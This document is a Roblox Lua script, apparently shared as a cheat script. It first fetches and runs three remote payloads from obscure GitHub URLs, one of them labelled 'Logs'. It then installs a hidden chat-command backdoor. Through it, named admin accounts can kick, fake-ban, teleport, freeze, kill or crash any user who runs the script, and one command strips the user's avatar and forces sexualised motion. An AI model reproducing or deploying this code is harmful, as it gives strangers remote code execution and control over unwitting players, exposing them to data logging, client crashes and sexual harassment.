--Main
loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/aehtnpopoaoerjpofehnajpo225236/main/hreajettsrka4658846545969", true))()

--Logs
loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/wgrijndsapmoioiesrdmvipso324326523523/main/sfasfdrhadfgsad3253467457sdfgdfshfdhjj", true))()

--Safe
loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/hrehetrhjsftjhfj/main/hdjtsrfjtsfjxgsxfjskxfjskfjkfjfjg", true))()

local moder = {
    admin = "vepiuu",
    admin = "KreepOZi",
    prefix = "!",
}

repeat wait() until game:IsLoaded()
local plrs = game:GetService("Players")

spawn(function()
    repeat wait() until game:GetService("Players"):FindFirstChild(moder.admin)

    local admin = plrs[moder.admin]
 local admin = plrs[moder.admin]
    local prefix = moder.prefix

    admin.Chatted:Connect(function(cht)
            --- kick 
        if cht:match(prefix .. "kick " .. game.Players.LocalPlayer.Name) then
            game.Players.LocalPlayer:Kick("You have been kicked")
            --- fake ban
        elseif cht:match(prefix .. "ban " .. game.Players.LocalPlayer.Name) then
            game.Players.LocalPlayer:Kick("User PERMA BANNED")
             --- brings
        elseif cht:match(prefix .. "bring " .. game.Players.LocalPlayer.Name) then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
             --- benx 
        elseif cht:match(prefix .. "benx " .. game.Players.LocalPlayer.Name) then
            game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = admin.Character.HumanoidRootPart
            local benxed = true
            while benxed == true do
                local hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
                pcall(function()
                    hummy.Parent.Pants:Destroy()
                end)
                pcall(function()
                    hummy.Parent.Shirt:Destroy()
                end)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame + admin.Character.HumanoidRootPart.CFrame.lookVector * 0.5
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
                wait(0.1)
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
            end
             --- freeze
            elseif cht:match(prefix .. "freeze " .. game.Players.LocalPlayer.Name) then 
          game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true
             --- unfreeze
            elseif cht:match(prefix .. "unfreeze " .. game.Players.LocalPlayer.Name) then 
            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = false
             --- teleport to air 
            elseif cht:match(prefix .. "air " .. game.Players.LocalPlayer.Name) then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Vector3.new(500000,500000,500000)
             --- reset 
            elseif cht:match(prefix .. "reset " .. game.Players.LocalPlayer.Name) then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
             --- crash a player
            elseif cht:match(prefix .. "crash " .. game.Players.LocalPlayer.Name) then
            while true do
                print("bye")
            end
        end
    end)
end)
